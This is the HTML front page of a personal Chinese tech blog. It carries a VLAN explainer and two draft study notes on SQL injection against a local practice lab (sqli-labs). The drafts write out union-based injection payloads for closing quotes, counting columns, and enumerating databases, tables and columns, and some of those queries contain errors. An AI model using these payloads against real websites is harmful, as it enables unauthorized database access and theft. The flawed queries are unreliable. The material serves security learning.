@@ -1,0 +1,1388 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="Ymnnb" />
+       
+      <meta name="description" content="Ymnnb Blog" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title> Ymnnb</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/1.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      
+<section class="cover">
+    
+  <div class="cover-frame">
+    <div class="bg-box">
+      <img src="/images/cover1.jpg" alt="image frame" />
+    </div>
+    <div class="cover-inner text-center text-white">
+      <h1><a href="/">Ymnnb</a></h1>
+      <div id="subtitle-box">
+        
+        <span id="subtitle"></span>
+        
+      </div>
+      <div>
+        
+      </div>
+    </div>
+  </div>
+  <div class="cover-learn-more">
+    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
+  </div>
+</section>
+
+
+
+<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>
+
+
+<!-- Subtitle -->
+
+  <script>
+    try {
+      var typed = new Typed("#subtitle", {
+        strings: ['Ymnnb', 'Ymnnb！', '我想去看海'],
+        startDelay: 0,
+        typeSpeed: 200,
+        loop: true,
+        backSpeed: 100,
+        showCursor: true
+      });
+    } catch (err) {
+      console.log(err)
+    }
+  </script>
+  
+<div id="main">
+  <section class="outer">
+  
+  <ul class="ads">
+    
+        <li>
+            <a href="">
+                <img src="" width="300" alt="">
+            </a>
+        </li>
+    
+        <li>
+            <a href="">
+                <img src="" width="300" alt="">
+            </a>
+        </li>
+    
+</ul>
+  
+  
+  
+
+<div class="notice" style="margin-top:50px">
+    <i class="ri-heart-fill"></i>
+    <div class="notice-content" id="broad"></div>
+</div>
+<script type="text/javascript">
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("broad").innerHTML = data.hitokoto;
+        })
+        .catch(console.error)
+</script>
+
+<style>
+    .notice {
+        padding: 20px;
+        border: 1px dashed #e6e6e6;
+        color: #969696;
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        background: #fbfbfb50;
+        border-radius: 10px;
+    }
+
+    .notice i {
+        float: left;
+        color: #999;
+        font-size: 16px;
+        padding-right: 10px;
+        vertical-align: middle;
+        margin-top: -2px;
+    }
+
+    .notice-content {
+        display: initial;
+        vertical-align: middle;
+    }
+</style>
+  
+  <article class="articles">
+    
+    
+    
+    
+    <article
+  id="post-vlan"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/vlan/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.185Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="什么是VLAN"><a href="#什么是VLAN" class="headerlink" title="什么是VLAN"></a>什么是VLAN</h1><p>VLAN（Virtual Local Area Network）即虚拟局域网，是将一个物理的LAN在逻辑上划分成多个广播域的通信技术。<br>每个VLAN是一个广播域，VLAN内的主机间可以直接通信，而VLAN间则不能直接互通。这样，广播报文就被限制在一个VLAN内。</p>
+<h2 id="为什么需要VLAN"><a href="#为什么需要VLAN" class="headerlink" title="为什么需要VLAN"></a>为什么需要VLAN</h2><p>早期以太网是一种基于CSMA&#x2F;CD（Carrier Sense Multiple Access&#x2F;Collision Detection）的共享通讯介质的数据网络通讯技术。当主机数目较多时会导致冲突严重、广播泛滥、性能显著下降甚至造成网络不可用等问题。通过二层设备实现LAN互连虽然可以解决冲突严重的问题，但仍然不能隔离广播报文和提升网络质量。</p>
+<p>在这种情况下出现了VLAN技术。这种技术可以把一个LAN划分成多个逻辑的VLAN，每个VLAN是一个广播域，VLAN内的主机间通信就和在一个LAN内一样，而VLAN间则不能直接互通，广播报文就被限制在一个VLAN内。如下图所示。</p>
+<p><img src="https://download.huawei.com/mdl/image/download?uuid=31e82e94f6c34998b68ca5c54def78dd" alt="VLAN的作用"><br><em>VLAN的作用</em></p>
+<p>因此，VLAN具备以下优点：</p>
+<ul>
+<li><strong>限制广播域</strong>：广播域被限制在一个VLAN内，节省了带宽，提高了网络处理能力。</li>
+<li><strong>增强局域网的安全性</strong>：不同VLAN内的报文在传输时相互隔离，即一个VLAN内的用户不能和其它VLAN内的用户直接通信。</li>
+<li><strong>提高了网络的健壮性</strong>：故障被限制在一个VLAN内，本VLAN内的故障不会影响其他VLAN的正常工作。</li>
+<li><strong>灵活构建虚拟工作组</strong>：用VLAN可以划分不同的用户到不同的工作组，同一工作组的用户也不必局限于某一固定的物理范围，网络构建和维护更方便灵活。</li>
+</ul>
+<h2 id="VLAN-vs-子网"><a href="#VLAN-vs-子网" class="headerlink" title="VLAN vs 子网"></a>VLAN vs 子网</h2><p>通过将IP地址的网络部分进一步划分为若干个子网，可以解决IP地址空间利用率低和两级IP地址不够灵活的问题。</p>
+<p>与VLAN相类似的是，子网也可以隔离主机间的通信。属于不同VLAN的主机之间不能直接通信，属于不同的子网的主机之间也不能直接通信。但二者没有必然的对应关系。</p>
+<p><img src="https://download.huawei.com/mdl/image/download?uuid=147da9864db1436982755b69d9355464" alt="VLAN vs 子网"><br><em>VLAN vs 子网</em></p>
+<h2 id="VLAN-Tag和VLAN-ID"><a href="#VLAN-Tag和VLAN-ID" class="headerlink" title="VLAN Tag和VLAN ID"></a>VLAN Tag和VLAN ID</h2><p>要使交换机能够分辨不同VLAN的报文，需要在报文中添加标识VLAN信息的字段。IEEE <a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/QinQ.html">802.1Q</a>协议规定，在以太网数据帧中加入4个字节的VLAN标签（又称VLAN Tag，简称Tag），用以标识VLAN信息。</p>
+<p><img src="https://download.huawei.com/mdl/image/download?uuid=6b7f04dbe20643d3a42fe55ad4eb6cef" alt="IEEE 802.1Q封装的VLAN数据帧格式"><br><em>IEEE 802.1Q封装的VLAN数据帧格式</em></p>
+<p>数据帧中的VID字段标识了该数据帧所属的VLAN，数据帧只能在其所属VLAN内进行传输。VID字段代表VLAN ID，VLAN ID取值范围是0～4095。由于0和4095为协议保留取值，所以VLAN ID的有效取值范围是1～4094。</p>
+<p>交换机内部处理的数据帧都带有VLAN标签。而交换机连接的部分设备（如用户主机、服务器）只会收发不带VLAN tag的传统以太网数据帧。因此，要与这些设备交互，就需要交换机的接口能够识别传统以太网数据帧，并在收发时给帧添加、剥除VLAN标签。添加什么VLAN标签，由接口上的缺省VLAN（Port Default VLAN ID，PVID）决定。</p>
+<h3 id="VLAN的接口类型和VLAN标签的处理机制"><a href="#VLAN的接口类型和VLAN标签的处理机制" class="headerlink" title="VLAN的接口类型和VLAN标签的处理机制"></a>VLAN的接口类型和VLAN标签的处理机制</h3><p>现网中属于同一个VLAN的用户可能会被连接在不同的交换机上，且跨越交换机的VLAN可能不止一个，如果需要用户间的互通，就需要交换机间的接口能够同时识别和发送多个VLAN的数据帧。根据接口连接对象以及对收发数据帧处理的不同，当前有VLAN的多种接口类型，以适应不同的连接和组网。</p>
+<p>不同厂商对VLAN接口类型的定义可能不同。对于华为设备来说，常见的VLAN接口类型有三种，包括：Access、Trunk和Hybrid。</p>
+<h3 id="接口类型"><a href="#接口类型" class="headerlink" title="接口类型"></a>接口类型</h3><p>根据接口连接对象以及对收发数据帧处理的不同，以太网接口分为：</p>
+<ul>
+<li><strong>Access接口</strong><br>Access接口一般用于和不能识别Tag的用户终端（如用户主机、服务器等）相连，或者不需要区分不同VLAN成员时使用。它只能收发Untagged帧，且只能为Untagged帧添加唯一VLAN的Tag。</li>
+<li><strong>Trunk接口</strong><br>Trunk接口一般用于连接交换机、路由器、AP以及可同时收发Tagged帧和Untagged帧的语音终端。它可以允许多个VLAN的帧带Tag通过，但只允许一个VLAN的帧从该类接口上发出时不带Tag（即剥除Tag）。</li>
+<li><strong>Hybrid接口</strong><br>Hybrid接口既可以用于连接不能识别Tag的用户终端（如用户主机、服务器等）和网络设备（如Hub），也可以用于连接交换机、路由器以及可同时收发Tagged帧和Untagged帧的语音终端、AP。它可以允许多个VLAN的帧带Tag通过，且允许从该类接口发出的帧根据需要配置某些VLAN的帧带Tag（即不剥除Tag）、某些VLAN的帧不带Tag（即剥除Tag）。</li>
+</ul>
+<h3 id="Access接口"><a href="#Access接口" class="headerlink" title="Access接口"></a>Access接口</h3><p>Access接口一般用于和不能识别Tag的用户终端（如用户主机、服务器）相连，或者不需要区分不同VLAN成员时使用。</p>
+<p>在一个VLAN交换网络中，以太网数据帧主要有以下两种形式：</p>
+<ul>
+<li>无标记帧（Untagged帧）：原始的、未加入4字节VLAN标签的帧。</li>
+<li>有标记帧（Tagged帧）：加入了4字节VLAN标签的帧。</li>
+</ul>
+<p>Access接口大部分情况只能收发Untagged帧，且只能为Untagged帧添加唯一VLAN的Tag。交换机内部只处理Tagged帧，所以Access接口需要给收到的数据帧添加VLAN Tag，也就必须配置缺省VLAN。配置缺省VLAN后，该Access接口也就加入了该VLAN。</p>
+<p>当Access接口收到带有Tag的帧，并且帧中VID与PVID相同时，Access接口也能接收并处理该帧。</p>
+<p>在发送带有Tag的帧前，Access接口会剥离Tag。</p>
+<h3 id="Trunk接口"><a href="#Trunk接口" class="headerlink" title="Trunk接口"></a>Trunk接口</h3><p>Trunk接口一般用于连接交换机、路由器、AP以及可同时收发Tagged帧和Untagged帧的语音终端。它可以允许多个VLAN的帧带Tag通过，但只允许属于缺省VLAN的帧从该类接口上发出时不带Tag（即剥除Tag）。</p>
+<p>Trunk接口上的缺省VLAN，有的厂商也将它定义为native VLAN。当Trunk接口收到Untagged帧时，会为Untagged帧打上Native VLAN对应的Tag。</p>
+<h3 id="Hybrid接口"><a href="#Hybrid接口" class="headerlink" title="Hybrid接口"></a>Hybrid接口</h3><p>Hybrid接口既可以用于连接不能识别Tag的用户终端（如用户主机、服务器）和网络设备（如Hub），也可以用于连接交换机、路由器以及可同时收发Tagged帧和Untagged帧的语音终端、AP。它可以允许多个VLAN的帧带Tag通过，且允许从该类接口发出的帧根据需要配置某些VLAN的帧带Tag（即不剥除Tag）、某些VLAN的帧不带Tag（即剥除Tag）。</p>
+<p>Hybrid接口和Trunk接口在很多应用场景下可以通用，但在某些应用场景下，必须使用Hybrid接口。比如在灵活<a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/QinQ.html">QinQ</a>中，服务提供商网络的多个VLAN的报文在进入用户网络前，需要剥离外层VLAN Tag，此时Trunk接口不能实现该功能，因为Trunk接口只能使该接口缺省VLAN的报文不带VLAN Tag通过。</p>
+<h3 id="网络互联三种端口区别"><a href="#网络互联三种端口区别" class="headerlink" title="网络互联三种端口区别"></a>网络互联三种端口区别</h3><h4 id="1-Access"><a href="#1-Access" class="headerlink" title="1.Access"></a>1.Access</h4><p><strong>Access端口：用于连接终端设备。</strong></p>
+<p><strong>Access类型的端口只能属于1个VLAN，一般用于连接计算机的端口；</strong></p>
+<p>Access接口只能属于一个VLAN，也就是只能传输一个VLAN数据。Access端口在从直连设备收到入站数据帧后，会判断这个数据帧是否携带VLAN标签，若不携带，则为数据帧插入本接口的PVID并进行下一步处理；若携带则判断数据帧的VLAN ID是否与本接口的PVID相同，若相同则进行下一步处理，若不同则丢弃。<br>Access端口在发送出站数据帧之前，会判断这个要被转发的数据帧中携带的VLAN ID是否与出站接口的PVID相同，若相同则去掉VLAN标签进行转发；若不同则丢弃。</p>
+<h4 id="2-Trunk"><a href="#2-Trunk" class="headerlink" title="2.Trunk"></a>2.Trunk</h4><p><strong>Trunk接口：用于连接交换机。</strong></p>
+<p><strong>Trunk类型的端口可以允许多个VLAN通过，可以接收和发送多个VLAN的报文，一般用于交换机之间连接的端口；</strong></p>
+<p>Trunk接口允许传输多个VLAN的数据。Trunk接口在从直连设备收到入站数据帧后，会判断这个数据帧是否携带VLAN标签，若不携带，则为数据帧插入本接口的PVID并进行下一步处理；若携带，则判断本接口是否允许传输这个数据帧的VLAN ID，若允许则进行下一步处理，否则丢弃。<br>Trunk接口在发送出站数据帧之前，会判断这个要被转发的数据帧中携带的VLAN ID是否与出站接口的PVID相同，若相同则去掉VLAN标签进行转发；若不同则判断本接口是否允许传输这个数据帧的VLAN ID，若允许则转发，否则丢弃。</p>
+<h4 id="3-Trunk与Hybrid的区别："><a href="#3-Trunk与Hybrid的区别：" class="headerlink" title="3.Trunk与Hybrid的区别："></a>3.Trunk与Hybrid的区别：</h4><p><strong>Hybrid类型的端口可以允许多个VLAN通过，可以接收和发送多个VLAN的报文，可以用于交换机之间连接，也可以用于连接用户的计算机。</strong></p>
+<p>收数据帧时是一致的。<br>发数据帧：Trunk接口只会摘除PVID标签。也就是说，当数据所属VLAN为该Trunk接口的缺省VLAN时，Trunk接口才会去掉VLAN标签进行转发；对于其他VLAN的数据，Trunk接口在转发时不会摘除响应的VLAN标签。而Hybrid接口能够以不携带VLAN标签的方式发送多个VLAN的数据。</p>
+<p>Hybrid端口和Trunk端口在接收数据时，处理方法是一样的，唯一不同之处在于发送数据时：Hybrid端口可以允许多个VLAN的报文发送时不打标签，而Trunk端口只允许缺省VLAN的报文发送时不打标签。</p>
+<h2 id="VLAN的使用场景"><a href="#VLAN的使用场景" class="headerlink" title="VLAN的使用场景"></a>VLAN的使用场景</h2><p>VLAN的常见使用场景包括：VLAN间用户的二层隔离，VLAN间用户的三层互访。</p>
+<h3 id="VLAN间用户的二层隔离"><a href="#VLAN间用户的二层隔离" class="headerlink" title="VLAN间用户的二层隔离"></a>VLAN间用户的二层隔离</h3><p>如下图所示，某商务楼内有多家公司，为了降低成本，多家公司共用网络资源，各公司分别连接到一台二层交换机的不同接口，并通过统一的出口访问Internet。</p>
+<p><img src="https://download.huawei.com/mdl/image/download?uuid=b07e3ea07ec04d3c806483ca06846958" alt="基于接口的VLAN划分组网图"></p>
+<p><em>基于接口的VLAN划分组网图</em></p>
+<p>为了保证各公司业务的独立和安全，可将每个公司所连接的接口划分到不同的VLAN，实现公司间业务数据的完全隔离。可以认为每个公司拥有独立的“<a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E8%99%9A%E6%8B%9F%E8%B7%AF%E7%94%B1%E5%99%A8.html">虚拟路由器</a>”，每个VLAN就是一个“虚拟工作组”。</p>
+<p>再比如，某公司有两个部门，分别分配了固定的IP网段。为加强员工间的学习与交流，员工的位置有时会相互调动，但公司希望各部门员工访问的网络资源的权限不变。</p>
+<p><img src="https://download.huawei.com/mdl/image/download?uuid=aac85511d6a440928478e7307d8614cd" alt="基于IP的VLAN划分组网图"></p>
+<p><em>基于IP的VLAN划分组网图</em></p>
+<p>为了保证部门内员工的位置调整后，访问网络资源的权限不变，可在公司的交换机Switch_1上配置基于IP子网划分VLAN。这样，服务器的不同网段就划分到不同的VLAN，访问服务器不同应用服务的数据流就会隔离，提高了安全性。</p>
+<h3 id="VLAN间用户的三层互访"><a href="#VLAN间用户的三层互访" class="headerlink" title="VLAN间用户的三层互访"></a>VLAN间用户的三层互访</h3><p>如下图所示，某小型公司的两个部门分别通过二层交换机接入到一台三层交换机Switch_3，所属VLAN分别为VLAN2和VLAN3，部门1和部门2的用户互通时，需要经过三层交换机。</p>
+<p><img src="https://download.huawei.com/mdl/image/download?uuid=35ceb2d067304310b72c1cdf5f445b82" alt="通过VLANIF实现VLAN间用户的三层互访"><br><em>通过VLANIF实现VLAN间用户的三层互访</em></p>
+<p>可在Switch_1和Switch_2上划分VLAN并将VLAN透传到Switch_3上，然后在Switch_3上为每个VLAN配置一个VLANIF接口，实现VLAN2和VLAN3间的路由。</p>
+<h2 id="VLAN的相关协议"><a href="#VLAN的相关协议" class="headerlink" title="VLAN的相关协议"></a>VLAN的相关协议</h2><h3 id="IEEE-802-1Q"><a href="#IEEE-802-1Q" class="headerlink" title="IEEE 802.1Q"></a>IEEE 802.1Q</h3><p>IEEE <a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/QinQ.html">802.1Q</a>（也被称为<a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/QinQ.html">Dot1q</a>）即Virtual Bridged Local Area Networks协议，规定了VLAN的实现标准。与标准的以太网数据帧相比，VLAN数据帧增加了1个4字节的VLAN标签。</p>
+<h3 id="LNP"><a href="#LNP" class="headerlink" title="LNP"></a>LNP</h3><p>链路类型协商协议（Link-type Negotiation Protocol，LNP）用来动态协商以太网接口的链路类型为Access或者Trunk。</p>
+<ul>
+<li>以太网接口的链路类型协商为Access，缺省情况下加入VLAN1。</li>
+<li>以太网接口的链路类型协商为Trunk，缺省情况下加入VLAN1～4094。</li>
+</ul>
+<h3 id="QinQ"><a href="#QinQ" class="headerlink" title="QinQ"></a>QinQ</h3><p><a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/QinQ.html">QinQ</a>（802.1Q-in-802.1Q）协议出自<a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/QinQ.html">IEEE 802.1ad</a>标准协议，通过在802.1Q标签报文的基础上再增加一层802.1Q的Tag来达到扩展VLAN空间的功能，可以使私网VLAN透传公网。</p>
+<p>由于在骨干网中传递的报文有两层802.1Q Tag（一层公网Tag，一层私网Tag），即802.1Q-in-802.1Q，所以称之为QinQ协议。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-sql注入草稿"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/sql%E6%B3%A8%E5%85%A5%E8%8D%89%E7%A8%BF/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.182Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>127.0.0.1&#x2F;sqli&#x2F;union.php?id &#x3D; 0 union select 1,2,3,4<br>select 1,2,3,4<br>select 1,2,3,4表示占位符<br>就比如前面id &#x3D; 0没有查到数据的时候，就会填补到查询结果中<br>例如：?id &#x3D; 1 union select 1,2,3,4可以查到数据<br>得到： Name：lihua  Year：2002<br>?id &#x3D; 0 union select 1,2,3,4 不能查到数据<br>那么就得到：  Name：2  Year：3<br>后面的1,2,3,4给顶上去<br>这里1,2,3,4代表有多少个字段<br>Name：2  Year：3<br>代表Name是第二个字段，Year是第三个字段<br>如果改为 ?id &#x3D; 0 union select 1,database(),3,4<br>可得到：  Name：player  Year：3<br>player是表名<br>为什么1,4没有显示呢？<br>在平时的查询中，通常不会将所有的数据展示出来<br>而只是展示部分字段<br>可得到：  Name：test  Year：3<br>database()得到test是数据库名<br>如何得到表名<br>我们需要查询版本号<br>version()<br> ?id &#x3D; 0 union select 1,version(),3,4<br>版本为5.0以上，存在information_schema表<br>这个表可以查询到表名<br> ?id &#x3D; 0 union select 1,22,table_name,4 from information_schema.tables where information_schema&#x3D;database()<br>如果我们表不止一个<br>我们可以通过<br>limit n,m &#x3D;&#x3D;&#x3D;&gt; 从N+1开始取数据，取m行<br> ?id &#x3D; 0 union select 1,22,table_name,4 from information_schema.tables where information_schema&#x3D;database() limit 0,1<br>从第一行开始查一行<br> ?id &#x3D; 0 union select 1,22,table_name,4 from information_schema.tables where information_schema&#x3D;database() limit 1，1<br>从第二行开始去一行<br>若没有，则说明只有一行数据<br>即只有一个表<br>或者通过函数<br>group_concat()<br>concat<br>select concat(1,2,3)<br>结果为123，分别把123拼接了起来<br> ?id &#x3D; 0 union select 1,22,group_concat(table_name),4 from information_schema.tables where information_schema&#x3D;database() limit 1，1<br>这样可以查出所以表名<br>查出表名，就要查字段名<br> ?id &#x3D; 0 union select 1,22,group_concat(columns_name),4 from information_schema.columns where information_schema&#x3D;database() and table_name &#x3D; ‘player’<br>有了表名，字段名<br>就可以组成一个完整的字段名<br>select 11，id,name,44 from player limit 0,1<br>就可以组成一个完整的查询<br>字符型：127.0.0.1&#x2F;sqli&#x2F;union.php?id &#x3D; 1 ‘ and 1&#x3D;1 – qwe<br>后端的sql语句：select name,year from xxx where id &#x3D; ‘ &amp;id<br>id<br>id<br>id 被读取为 1 ‘ and 1&#x3D;1 – qwe<br>组成语句：select name,year from xxx where id &#x3D; ‘ 1 ‘ and 1&#x3D;1 – qwe ‘<br>这样的话，如果变量为字符型，就能被我们注入<br>为什么有一个– ，– 在sql中代表注释的意思<br>– 后面的语句不会被sql识别，这样就能去掉它本身的’<br>让语句成为我们自己拼凑的语句<br>为什么是– qwe（即在– 后面在上一串字母）<br>为什么如果不加上，url被读取的时候会自动消去掉后面的空格<br>也就达不到我们想要的效果</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-SQL注入（草稿）"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E8%8D%89%E7%A8%BF%EF%BC%89/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.180Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>SQL注入  是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。<br>即：注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句<br>一、漏洞原因分析<br>        我们都知道web分为前端和后端，前端负责数据显示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如mysql数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询。<br>这里使用到sqli-labs<br>sqli-labs第一关<br>按要求在url后面加上?id&#x3D;1，显示如下<br>Your Login name:Dumb<br>Your Password:Dumb<br>select语句：SELECT * FROM users WHERE id&#x3D;’1’ LIMIT 0,1<br>当我们改变id的值为2时，页面发生了改变。说明它将我们输入的数据代入到了数据中进行查询，页面根据输入数据的不同展示的内容也不同。</p>
+<p>在1后面加上单引号, ?id&#x3D;1’，页面显示有语法错误，说靠近 ‘1’’ limit 0,1有语法错误，我们输入的数据 1’ 被完整的带入到了SQL语句中，即直接与原有的sql语句进行了拼接。<br>然后执行的sql语句变成了  SELECT * FROM users WHERE id&#x3D;’1’’ LIMIT 0,1</p>
+<p>我们输入的那个单引号和前面的单引号产生了闭合，导致原有后面的那个单引号变成了多余，而sql语法中引号是必须成对出现否则就会报错，这也就解释了为什么输入1’后程序就报错的原因。</p>
+<p>既然我们输入什么程序就拼接什么，那我们就构造sql语句将左单引号进行闭合就好了。我们在1后面加上单引号，与左边的引号构成闭合，再接着拼接构造好的SQL语句并注释掉后边的语句 ‘  1 ‘ and 1&#x3D;1 –  ‘ LIMIT 0,1” 程序就不会报错，就可以查询我们想要查询的数据，这就是sql注入。</p>
+<p>比如：<br>语句：select name from xxx where id &#x3D; ‘ 1 ‘ and 1&#x3D;1 – qwe ‘<br>这样的话，如果变量为字符型，就能被我们注入<br>为什么有一个– ，– 在sql中代表注释的意思（还有其他的注释方式）<br>– 后面的语句不会被sql识别，这样就能去掉它本身的’<br>让语句成为我们自己拼凑的语句<br>为什么是– qwe（即在– 后面在上一串字母）<br>为什么如果不加上，url被读取的时候会自动消去掉后面的空格<br>也就达不到我们想要的效果</p>
+<p>二、漏洞危害<br>SQL注入漏洞对于数据安全的影响：<br>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。<br>破坏硬盘数据，瘫痪全系统。</p>
+<p>三、sql注入防范<br>对输入进行严格的转义和过滤<br>等…….</p>
+<p>四、如何挖掘sql注入漏洞</p>
+<p>五、常见的注入手法<br>SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。</p>
+<p>参数类型分类</p>
+<ol>
+<li><p>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。<br>如 <a target="_blank" rel="noopener" href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> 对应的sql语句为 select * from table where id&#x3D;3</p>
+</li>
+<li><p>字符型：字符型注入正好相反<br>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p>
+</li>
+</ol>
+<p>例如数字型语句：select * from table where id &#x3D;3<br>则字符型如下：select * from table where name&#x3D;’admin’</p>
+<p>注入手法分类<br>@   UNION query SQL injection（联合查询注入）<br>@   Error-based SQL injection（错型注入）<br>@   Boolean-based blind SQL injection（基于布尔的盲注）<br>@   Time-based blind SQL injection（基于时间的盲注）<br>@   Stacked queries SQL injection（可多语句查询注入）</p>
+<p>联合查询(union注入)<br>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 </p>
+<p>例题：<br>sqli-labs第一关<br>如下，要求我们传入一个id值过去。传参?id&#x3D;1，当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了</p>
+<ol>
+<li>注入点判断<br>开始判断是否存在注入，输入?id&#x3D;1’，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，传入的参数直接在后端拼接为sql语句了，产生了sql注入漏洞</li>
+</ol>
+<p>继续判断，输入 ?id&#x3D;1’ and 1&#x3D;1 –+ 页面正常显示<br>输入?id&#x3D;1’ and 1&#x3D;2 –+ 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p>
+<p>页面会根据输入的数据变化而变化，当存在注入点时，优先考虑使用联合注入手法。</p>
+<ol start="2">
+<li><p>判断当前表的字段个数<br>输入order by 3，页面无异常反应<br>?id&#x3D;1’ order by 3 –+<br>将3修改为4，此时显示未知的列，说明此时当前表中只有3列<br>?id&#x3D;1’ order by 4 –+ </p>
+</li>
+<li><p>判断显示位<br>以下为union注入中较为常用的一些函数和环境变量</p>
+</li>
+</ol>
+<p>接下来测试输入会在屏幕哪个地方进行回显。<br>上面我们判断出来了表中有3列，所以union select的时候就写xx,xx,xx三个数据<br>需让union select前面的参数查不出来而回显后面的语句，所以id&#x3D;-1’<br>?id&#x3D;-1’ union select 1,2,3 –+ </p>
+<p>补充：<br>select 1,2,3<br>select 1,2,3表示占位符<br>就比如前面id &#x3D; 0没有查到数据的时候，就会填补到查询结果中<br>例如：?id &#x3D; 1 union select 1,2,3可以查到数据<br>得到： Name：lihua  Year：2002<br>?id &#x3D; 0 union select 1,2,3,4 不能查到数据<br>那么就得到：  Name：2  Year：3<br>后面的1,2,3给顶上去<br>这里1,2,3代表有多少个字段<br>Name：2  Year：3<br>代表Name是第二个字段，Year是第三个字段</p>
+<p>?id&#x3D;-1’ union select 1,2,3 –+<br>结果是：在name和password值中回显了我们的输入，这时我们就可以在回显2或3的放置放入测试语句。</p>
+<ol start="4">
+<li><p>爆当前数据库名字<br>我们将select 1,2,3中的3替代为sql的函数，来代替我们去查询<br>因为我们的语句会被传入到后端进行拼接，所以这些函数，例如database()，也会被传入，然后执行<br>后端的语句：<br>SELECT * FROM users WHERE id&#x3D;’-1’ union select 1,2,database() – ‘ LIMIT 0,1<br>就可以查询到数据库名字<br>?id&#x3D;-1’ union select 1,2,database() –+<br>可获取当前数据库名为“security”<br>Your Login name:2<br>Your Password:security</p>
+</li>
+<li><p>爆当前数据库中的表</p>
+</li>
+</ol>
+<p>#使用语句<br>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+</p>
+<p>显示当前数据库中存在4个表“emails,referers,uagents,users”<br>Your Login name:2<br>Your Password:emails,referers,uagents,users</p>
+<p>database()查到数据库名<br>如何得到表名<br>我们需要查询版本号<br>version()<br> ?id &#x3D; 0 union select 1,version(),3<br>版本为5.0以上，存在information_schema表<br>这个表可以查询到表名<br> ?id &#x3D; 0 union select 1,22,table_name from information_schema.tables where information_schema&#x3D;database()</p>
+<ol start="6">
+<li>爆表中的字段<br>这里选择users表进行进一步的获取表中的字段信息</li>
+</ol>
